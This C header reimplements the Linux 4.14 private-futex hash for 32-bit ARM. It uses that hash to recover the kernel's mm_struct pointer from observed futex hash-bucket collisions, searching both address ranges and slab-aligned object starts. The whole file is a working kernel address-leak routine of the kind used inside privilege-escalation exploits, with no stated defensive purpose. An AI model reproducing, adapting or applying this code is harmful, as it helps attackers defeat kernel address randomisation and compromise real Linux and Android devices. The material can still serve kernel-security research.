#ifndef KARA_RECLAIM_HASH_H
#define KARA_RECLAIM_HASH_H

#include <stddef.h>
#include <stdint.h>

#define KARA_PAGE_SIZE 4096u
#define KARA_MAX_HITS 8u

struct kara_best_score {
    uint32_t value;
    unsigned score;
    unsigned ties;
};

static inline void kara_best_score_consider(struct kara_best_score *best,
                                            uint32_t value, unsigned score)
{
    if (!best || !score)
        return;
    if (score > best->score) {
        best->value = value;
        best->score = score;
        best->ties = 1u;
    } else if (score == best->score && value != best->value) {
        ++best->ties;
    }
}

static inline uint32_t kara_best_score_unique(
    const struct kara_best_score *best, unsigned minimum)
{
    return best && best->score >= minimum && best->ties == 1u
               ? best->value
               : 0u;
}

static inline uint32_t kara_rol32(uint32_t value, unsigned shift)
{
    return (value << shift) | (value >> (32u - shift));
}

/*
 * Linux 4.14 private-futex key on 32-bit ARM:
 *   key.word = page-aligned userspace address
 *   key.ptr  = current->mm
 *   key.offset = offset within the userspace page
 * hash_futex() applies jhash2(key words, 2, key.offset).
 */
static inline uint32_t kara_futex_hash(uintptr_t address, uint32_t mm,
                                       uint32_t mask)
{
    uint32_t page = (uint32_t)address & ~(KARA_PAGE_SIZE - 1u);
    uint32_t offset = (uint32_t)address & (KARA_PAGE_SIZE - 1u);
    uint32_t base = 0xdeadbeefu + (2u << 2) + offset;
    uint32_t a = base + page;
    uint32_t b = base + mm;
    uint32_t c = base;

    c ^= b;
    c -= kara_rol32(b, 14);
    a ^= c;
    a -= kara_rol32(c, 11);
    b ^= a;
    b -= kara_rol32(a, 25);
    c ^= b;
    c -= kara_rol32(b, 16);
    a ^= c;
    a -= kara_rol32(c, 4);
    b ^= a;
    b -= kara_rol32(a, 14);
    c ^= b;
    c -= kara_rol32(b, 24);

    return c & mask;
}

static inline int kara_hits_match(const uintptr_t *hits, unsigned hit_count,
                                  uint32_t mm, uint32_t mask)
{
    if (!hits || hit_count < 2u)
        return 0;

    uint32_t expected = kara_futex_hash(hits[0], mm, mask);
    for (unsigned i = 1; i < hit_count; ++i) {
        if (kara_futex_hash(hits[i], mm, mask) != expected)
            return 0;
    }
    return 1;
}

static inline uint32_t kara_solve_mm_range(const uintptr_t *hits,
                                           unsigned hit_count,
                                           uint32_t start, uint32_t end,
                                           uint32_t step, uint32_t mask)
{
    if (!hits || hit_count < 2u || !step || start >= end)
        return 0;

    for (uint32_t mm = start; mm < end; mm += step) {
        if (kara_hits_match(hits, hit_count, mm, mask))
            return mm;
        if (UINT32_MAX - mm < step)
            break;
    }
    return 0;
}

static inline unsigned kara_score_candidates(uintptr_t target,
                                             const uintptr_t *candidates,
                                             unsigned candidate_count,
                                             uint32_t mm, uint32_t mask)
{
    uint32_t expected = kara_futex_hash(target, mm, mask);
    unsigned score = 0;

    for (unsigned i = 0; i < candidate_count; ++i) {
        if (kara_futex_hash(candidates[i], mm, mask) == expected)
            ++score;
    }
    return score;
}

/* Search only allocator-valid object starts within each order-N slab. */
static inline uint32_t kara_solve_mm_grid(uintptr_t target,
                                         const uintptr_t *candidates,
                                         unsigned candidate_count,
                                         uint32_t start, uint32_t end,
                                         uint32_t slab_size,
                                         uint32_t object_size,
                                         unsigned objects_per_slab,
                                         unsigned min_matches,
                                         uint32_t mask)
{
    if (!candidates || !candidate_count || !slab_size || !object_size ||
        !objects_per_slab || !min_matches || min_matches > candidate_count ||
        start >= end || (slab_size & (slab_size - 1u)))
        return 0;

    uint32_t slab = start & ~(slab_size - 1u);
    if (slab < start) {
        if (UINT32_MAX - slab < slab_size)
            return 0;
        slab += slab_size;
    }

    while (slab < end) {
        for (unsigned i = 0; i < objects_per_slab; ++i) {
            uint64_t wide = (uint64_t)slab + (uint64_t)i * object_size;
            if (wide >= end || wide > UINT32_MAX)
                break;
            uint32_t mm = (uint32_t)wide;
            if (kara_score_candidates(target, candidates, candidate_count,
                                      mm, mask) >= min_matches)
                return mm;
        }
        if (UINT32_MAX - slab < slab_size)
            break;
        slab += slab_size;
    }
    return 0;
}

#endif
